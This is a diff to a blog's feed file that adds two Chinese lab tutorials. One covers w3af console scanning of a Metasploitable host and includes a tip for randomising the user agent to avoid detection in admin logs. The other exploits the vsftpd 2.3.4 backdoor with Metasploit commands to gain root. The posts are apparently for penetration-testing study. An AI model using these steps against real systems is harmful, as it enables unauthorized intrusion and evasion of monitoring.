@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>w3af命令行模式</title>
+      <link href="/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/"/>
+      <url>/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<hr><hr><p>使用w3af进行Web应用安全漏洞测试：</p><p>​    靶机：Metasploitable （192.168.157.133）</p><p>​    攻击机：Kali  2.0（192.168.157.132）</p><p>1.首先打开Kali 2.0终端输入w3af_console进入w3af命令行模式</p><p><img src="https://img.vim-cn.com/16/3de2f11d238db59150ac279d86b38000844b4b.png" alt="0"></p><p>2.help命令列出当前命令提示符下可用的命令</p><p><img src="https://img.vim-cn.com/4f/67a46f9feec6ebb4483bff9862db51453d7073.png" alt="1"></p><p>start         | Start the scan.    开始扫描</p><p>plugins       | Enable and configure plugins.    选择和配置插件</p><p>exploit       | Exploit the vulnerability.    使用该模块进行攻击漏洞</p><p>profiles      | List and use scan profiles.    列出可以用来扫描的文件</p><p>cleanup       | Cleanup before starting a new scan.    在开始新扫描之前进行清理 </p><p>version       | Show w3af version information.    显示w3af版本信息 </p><p>keys          | Display key shortcuts.    显示关键快捷方式</p><p>http-settings | Configure the HTTP settings of the framework.    配置框架的HTTP设置</p><p>misc-settings | Configure w3af misc settings.    配置w3af misc设置</p><p>target        | Configure the target URL.    配置目标URL</p><p>back          | Go to the previous menu.    返回前一目录</p><p>exit          | Exit w3af.    退出</p><p>kb            | Browse the vulnerabilities stored in the Knowledge Base    浏览存储在知识库中的漏洞</p><p>3.输入plugins，进入插件目录内，输入help显示当前可使用的命令</p><p><img src="https://img.vim-cn.com/e7/e9edb430dff3d0b78d0e7e25e0ee611ecbc2d3.png" alt="2"></p><p>4.输入list audit列出audit插件类中的小插件</p><p><img src="https://img.vim-cn.com/d1/c01a732b8e6b052b0f1ad03af4616da0d86b6b.png" alt="3"></p><p>5.使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个</p><p><img src="https://img.vim-cn.com/55/b2325a235259f1b3c74d9b0aaa277981279458.png" alt="4"></p><p>6.使用audit模块中所有的插件进行扫描</p><p><img src="https://img.vim-cn.com/ab/f0c982be5976f2ef1db412f69ccbccc5a4b9d1.png" alt="5"></p><p>7.输入crawl模块，按两次tab键，可以显示该模块下的插件，选择该模式下的web爬虫模块</p><p><img src="https://img.vim-cn.com/d2/723195423fb79bf0d8ca814b21e1631d14c61a.png" alt="6"></p><p>8.进入profiles模块，这个模块用于自定义组合插件，当然w3af自定义了一些组合插件</p><p><img src="https://img.vim-cn.com/16/539e19e801753e770567f944ef27266c85c42b.png" alt="7"></p><p>9.列出在profiles模块下的插件</p><p><img src="https://img.vim-cn.com/af/9d55984dbc05ff4c8dcdde1ad55b1558d10c5d.png" alt="8"></p><p>10.下面我们来用一下这些自定义插件</p><p><img src="https://img.vim-cn.com/29/d0dfd113d13592e1042fd91bda95204f4ec6f0.png" alt="9"></p><p>save_as test    使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内</p><p>save_as test self-contained    将test文件独立出来,以便供其他人使用</p><p>use test    使用自定义的test文件中的配置进行扫描</p><p>back    返回上一级</p><p>11.进入http-settings，设置全局参数</p><p><img src="https://img.vim-cn.com/56/c6f4645fafd4b9aacb08f399dffaf66e55a0a8.png" alt="10"></p><p>set    | Set a parameter value.    设置参数值</p><p>save   | Save the configured settings.    保存配置</p><p>set rand_user_agent True    设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现</p><p>12.进入misc-setting全局设置选项中</p><p><img src="https://img.vim-cn.com/ec/f75580f3f2eb51267e8a38a23f0068deaf3ac6.png" alt="11"></p><p>view    查看需要配置的参数</p><p><img src="https://img.vim-cn.com/38/38c14b10664f6090b97fe9cac422c6af5c18f3.png" alt="12"></p><p>set fuzz_url_filenames True    设置对URL中的文件名进行模糊测试(Fuzz)</p><p>13.进入target模块，设置目标信息，输入help查看在此模式下可使用的命令</p><p><img src="https://img.vim-cn.com/aa/f812283ea969ef8dddbc448938881e5b72a6b5.png" alt="13"></p><p>view    列出可用操作</p><p><img src="https://img.vim-cn.com/12/5f6f20f515c4d84e04ba7b4707b65174007595.png" alt="14"></p><p>set target http：//192.168.157.133    设置目标URL</p><p>set target_os unix    设置目标系统为unix</p><p>back    返回上级目录</p><p>start    开始扫描</p><p>Apache和PHP的版本也就被爆出来了，是不是很屌呢</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Linux笑脸漏洞渗透</title>
+      <link href="/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
+      <url>/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<hr><p>通过vsftpd_234_backdoor学习msf对渗透的利用：（可攻击系统为vsftpd version 2到2.3.4）</p><p>​    靶机：Linux（192.168.157.133）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(vsftpd_234_backdoor对应的漏洞端口为21)</p><p><img src="https://img.vim-cn.com/6b/041a673e71a5f391308868375a4a240b5a3eee.png" alt="0"></p><p>2.输入msfconsole进入搜索MS08_067可利用漏洞模块</p><p><img src="https://img.vim-cn.com/0b/d8b6d85b715d025d3998288986d3333f4cd04d.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</p><p>msf5 &gt; show optins</p><p>msf5 &gt; set RHOSTS 192.168.157.133</p><p>msf5 &gt; exploit</p><p><img src="https://img.vim-cn.com/09/05eb9c6ee17c26a22e8615f03ab5c8995a3c84.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 root最高权限,就可以对靶机进行为所欲为了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux通过smb服务渗透</title>
       <link href="/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/"/>
       <url>/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/</url>
